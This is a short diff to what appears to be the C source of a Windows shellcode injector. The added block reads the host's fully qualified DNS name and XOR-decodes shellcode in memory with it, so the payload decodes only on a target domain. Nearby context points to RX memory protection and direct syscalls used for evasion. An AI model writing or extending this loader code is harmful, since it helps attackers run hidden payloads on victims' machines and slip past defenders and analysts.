@@ -186,6 +186,24 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             wprintf(L"Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
         #endif
 
+        #ifdef XOR_KEY
+            unsigned long max_length = 256;
+            char domain[256] = { 0 };
+            if (!GetComputerNameExA(ComputerNameDnsFullyQualified, domain, &max_length)) {
+                #ifdef _DEBUG_
+                wprintf(L"ERROR: GetComputerNameExA = 0x%x\n", GetLastError());
+                #endif
+            } else {
+                #ifdef _DEBUG_
+                wprintf(L"GetComputerNameExA = %s\n", domain);
+                #endif
+            }
+
+            for (SIZE_T i = 0; i < size; i++) {
+                ((char*)allocation)[i] ^= domain[i % max_length];
+            }
+        #endif
+
         #ifdef RX
             DWORD old = 0;
             #ifdef SYSCALLS
